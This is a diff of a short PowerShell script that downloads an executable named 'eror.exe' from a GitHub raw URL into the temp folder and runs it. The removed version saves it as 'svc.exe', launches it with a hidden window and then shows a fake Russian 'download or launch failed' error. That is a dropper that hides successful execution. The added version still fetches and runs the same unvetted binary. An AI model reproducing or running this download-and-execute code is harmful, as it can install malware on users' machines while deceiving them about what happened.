@@ -1,6 +1,5 @@
-$url = «https://raw.githubusercontent.com/hal0151/erorft/refs/heads/main/eror.exe»
-$path = «$env:TEMP\svc.exe»
-irm $url -OutFile $path
-Start-Process -FilePath $path -WindowStyle Hidden
-Start-Sleep -Seconds 2
-Write-Host «Ошибка: Загрузка не удалась или запуск не удался.» -ForegroundColor Red
+# Скачиваем eror.exe во временную папку и запускаем его
+$url = "https://raw.githubusercontent.com/hal0151/erorft/main/eror.exe"
+$out = "$env:TEMP\eror.exe"
+Invoke-WebRequest -Uri $url -OutFile $out
+Start-Process -FilePath $out
